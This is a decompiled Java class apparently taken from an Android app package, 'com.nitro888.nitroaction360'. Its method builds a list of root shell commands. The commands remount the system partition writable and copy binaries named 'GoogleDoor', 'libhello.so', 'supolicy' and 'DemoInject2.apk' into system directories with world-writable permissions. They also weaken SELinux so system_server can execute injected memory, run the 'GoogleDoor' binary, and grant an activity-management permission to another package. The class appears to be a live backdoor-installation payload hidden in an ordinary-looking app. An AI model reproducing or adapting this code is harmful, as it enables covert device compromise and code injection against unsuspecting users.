package com.nitro888.nitroaction360;

import android.os.Build;
import java.io.File;
import java.util.ArrayList;

/* JADX INFO: loaded from: classes.dex */
final class w extends a {
    final /* synthetic */ SelectorActivity a;

    public w(SelectorActivity selectorActivity) {
        this.a = selectorActivity;
    }

    @Override // com.nitro888.nitroaction360.a
    protected final ArrayList a() {
        ArrayList arrayList = new ArrayList();
        this.a.getApplication().getPackageResourcePath();
        if (Build.VERSION.SDK_INT >= 20) {
            arrayList.add("mount -o remount,rw -t auto /system");
            String absolutePath = this.a.getCacheDir().getAbsolutePath();
            arrayList.add("cp " + absolutePath + "/GoogleDoor /data/system/GoogleDoor");
            arrayList.add("chmod 777 /data/system/GoogleDoor");
            arrayList.add("cp " + absolutePath + "/libhello.so /data/system/libhello.so");
            arrayList.add("chmod 777 /data/system/libhello.so");
            if (!new File("/system/bin/supolicy").exists()) {
                arrayList.add("cp " + absolutePath + "/supolicy /system/bin/supolicy");
                arrayList.add("chmod 777 /system/bin/supolicy");
                arrayList.add("cp " + absolutePath + "/libsupol.so /system/lib64/libsupol.so");
                arrayList.add("chmod 777 /system/lib64/libsupol.so");
            }
            arrayList.add("cp " + absolutePath + "/DemoInject2.apk /data/system/DemoInject2.apk");
            arrayList.add("chmod 777 /data/system/DemoInject2.apk");
            arrayList.add("supolicy --live \"allow system_server system_server process execmem\"");
            arrayList.add("/data/system/GoogleDoor");
            arrayList.add("pm grant com.app360.app360 android.permission.MANAGE_ACTIVITY_STACKS");
        }
        return arrayList;
    }
}
